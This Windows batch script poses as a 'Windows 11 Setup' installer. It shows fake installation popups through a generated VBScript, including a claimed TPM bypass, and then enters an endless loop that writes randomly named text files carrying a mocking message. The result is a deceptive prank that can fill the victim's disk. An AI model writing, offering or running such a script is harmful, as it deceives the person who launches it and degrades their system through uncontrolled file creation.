@echo off
title Windows 11 Setup
color 1F
echo Initializing Windows 11 installation...
ping localhost -n 3 >nul

:: Create the VBScript file correctly
(
echo Set objShell = CreateObject("WScript.Shell")
echo objShell.Popup "Installing Windows 11... Please wait.", 3, "Windows Installer", 64
echo objShell.Popup "Verifying system requirements...", 3, "Windows Installer", 64
echo objShell.Popup "ERROR: TPM 2.0 Not Found! Attempting to bypass...", 3, "Windows Installer", 48
echo objShell.Popup "Bypassing TPM... Done!", 2, "Windows Installer", 64
echo objShell.Popup "Installing system files...", 5, "Windows Installer", 64
echo objShell.Popup "Setup Completed! Restart Required.", 3, "Windows Installer", 64
) > %temp%\Win11Installer.vbs

:: Run the VBScript
start /min %temp%\Win11Installer.vbs

:: Wait for messages to finish
ping localhost -n 15 >nul

:: Now spam text files
:loop
echo bro did you believe it there is no way to install windows 11 on a windows xp computer > Windows11_%random%.txt
goto loop
